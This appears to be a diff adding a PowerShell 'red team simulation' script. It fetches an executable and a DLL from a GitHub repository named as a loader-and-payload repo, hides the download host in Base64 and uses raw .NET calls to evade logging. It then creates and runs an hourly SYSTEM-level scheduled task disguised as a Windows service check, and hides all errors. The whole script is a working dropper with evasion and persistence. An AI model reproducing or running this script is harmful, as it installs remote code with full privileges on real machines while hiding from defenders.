@@ -1,0 +1,153 @@
+# =============================================================================
+# Red Team Simulation v3 - GitHub File Downloader (Obfuscated & .NET WebClient)
+# =============================================================================
+# PURPOSE:
+#   This script automates the following for red team simulation exercises:
+#     1. Downloads two files from a GitHub repo using a Base64 encoded URL.
+#     2. Uses raw .NET classes to bypass basic PowerShell cmdlet logging.
+#     3. Saves the files directly to the Public user directory.
+#     4. Creates a Windows Scheduled Task for persistence.
+#
+# REQUIREMENTS:
+#   - Internet access.
+#   - Administrator privileges (Required for Scheduled Task creation).
+# =============================================================================
+
+# --- Suppress all prompts and progress bars ---
+Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force -ErrorAction SilentlyContinue
+$ConfirmPreference = 'None'
+$ProgressPreference = 'SilentlyContinue'
+$WarningPreference = 'SilentlyContinue'
+
+# =============================================================================
+# CONFIGURATION SECTION
+# =============================================================================
+
+# Target the Public directory to blend in better (e.g., C:\Users\Public)
+$DownloadFolder = "$env:SystemRoot\Temp"
+
+# The display name that appears in Task Scheduler.
+$ScheduledTaskName = "Windows Services and Checks"
+$RegisterScheduledTask = $true
+
+# GitHub repository coordinates
+$RepoOwner = "KentMichaelA"
+$RepoName = "Custom_Loader_and_Payload"
+$Branch = "main"
+
+# List of files to download
+$Files = @(
+    @{ Name = "calca.exe" },     
+    @{ Name = "usercpla.dll" }   
+)
+
+# =============================================================================
+# FUNCTION: Download-GitHubFile
+# =============================================================================
+function Download-GitHubFile {
+    param(
+        [string]$Owner,
+        [string]$Repo,
+        [string]$Branch,
+        [string]$FileName,
+        [string]$OutFolder
+    )
+
+    # Decode the Base64 URL on the fly to evade static string analysis
+    $EncodedDomain = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29t"
+    $DecodedDomain = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($EncodedDomain))
+    
+    # Build the raw download URL
+    $DownloadUri = "$DecodedDomain/$Owner/$Repo/$Branch/$FileName"
+    $OutPath = Join-Path $OutFolder $FileName
+
+    try {
+        # Force TLS 1.2 so the raw .NET request doesn't fail on older systems
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        
+        # Raw .NET download to avoid Invoke-WebRequest / iwr logging
+        $WebClient = New-Object System.Net.WebClient
+        $WebClient.DownloadFile($DownloadUri, $OutPath)
+        $WebClient.Dispose()
+
+        if (Test-Path -LiteralPath "$OutPath") {
+            $FileSize = (Get-Item -LiteralPath "$OutPath").Length
+            if ($FileSize -eq 0) {
+                Remove-Item -LiteralPath "$OutPath" -Force
+                throw "Downloaded file is empty (0 bytes)."
+            }
+            return $OutPath
+        }
+        else {
+            throw "File was not saved to disk."
+        }
+    }
+    catch {
+        # Catch errors gracefully (WebClient throws generic MethodInvocationException on 404s)
+        throw "Error downloading '$FileName': $($_.Exception.Message)"
+    }
+}
+
+# =============================================================================
+# FUNCTION: Register-WindowsServicesScheduledTask
+# =============================================================================
+function Register-WindowsServicesScheduledTask {
+    param(
+        [Parameter(Mandatory)]
+        [string]$TaskName,
+        [Parameter(Mandatory)]
+        [string]$ExePath
+    )
+
+    if (-not (Test-Path -LiteralPath "$ExePath")) {
+        throw "Executable not found: $ExePath"
+    }
+
+    $createArgs = '/create /tn "{0}" /tr "\"{1}\"" /sc hourly /ru System /rl highest /f' -f $TaskName, $ExePath
+    $proc = Start-Process -FilePath "schtasks.exe" -ArgumentList $createArgs -Wait -PassThru -WindowStyle Hidden
+
+    if ($proc.ExitCode -ne 0) {
+        throw "schtasks.exe failed (exit code $($proc.ExitCode))"
+    }
+
+    $runArgs = '/run /tn "{0}"' -f $TaskName
+    Start-Process -FilePath "schtasks.exe" -ArgumentList $runArgs -Wait -WindowStyle Hidden
+}
+
+# =============================================================================
+# MAIN EXECUTION
+# =============================================================================
+
+if (-not (Test-Path -LiteralPath "$DownloadFolder")) {
+    New-Item -ItemType Directory -Path "$DownloadFolder" -Force | Out-Null
+}
+
+$DownloadedFiles = @()
+
+foreach ($File in $Files) {
+    try {
+        $Path = Download-GitHubFile `
+            -Owner    $RepoOwner `
+            -Repo     $RepoName `
+            -Branch   $Branch `
+            -FileName $File.Name `
+            -OutFolder $DownloadFolder
+        $DownloadedFiles += $Path
+    }
+    catch {
+        # Silently continue
+    }
+}
+
+$CalcaExe = Join-Path $DownloadFolder "calca.exe"
+
+if ($DownloadedFiles.Count -eq $Files.Count) {
+    if ($RegisterScheduledTask) {
+        try {
+            Register-WindowsServicesScheduledTask -TaskName $ScheduledTaskName -ExePath $CalcaExe
+        }
+        catch {
+            # Silently continue
+        }
+    }
+}
